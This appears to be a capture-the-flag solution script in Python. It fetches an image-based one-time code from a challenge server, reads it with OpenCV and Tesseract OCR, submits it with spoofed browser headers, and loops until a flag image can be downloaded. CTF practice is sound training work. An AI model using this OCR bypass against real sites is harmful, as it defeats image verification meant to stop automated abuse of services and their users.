# Load the library
import cv2
import pytesseract
import requests
import shutil


IMAGE_URL="http://challenge.ctf.games:31135/static/otp.png"
FLAG_URL="http://challenge.ctf.games:31135/static/flag.png"
POST_URL="http://challenge.ctf.games:31135/"
DOMAIN="challenge.ctf.games:31135"
# HTTP_PROXY="http://127.0.0.1:8080"

FLAG_STATUS=404

headers = {
    'Host': 'challenge.ctf.games:31135',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '18',
    'Origin': 'http://challenge.ctf.games:31135',
    'Connection': 'close',
    'Referer': 'http://challenge.ctf.games:31135/',
    'Upgrade-Insecure-Requests': '1'
}

while(FLAG_STATUS != 200):
    img_data = requests.get(IMAGE_URL).content
    with open('./otp.png', 'wb') as handler:
        handler.write(img_data)
    img = cv2.imread('otp.png')

    img = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    thresh = cv2.threshold(img,0,255,cv2.THRESH_BINARY_INV + cv2.THRESH_OTSU)[1]
    txt = pytesseract.image_to_string(thresh,config= '--psm 6 digits')
    answer = txt.strip()
    print(answer + "\n")
    payload = {
        'otp_entry': answer
    }
    res = requests.post(POST_URL, headers=headers, data=payload)
    print(res.content)

    flag_data = requests.get(FLAG_URL)
    FLAG_STATUS=flag_data.status_code

with open('./flag.png', 'wb') as handler2:
    handler2.write(flag_data.content)
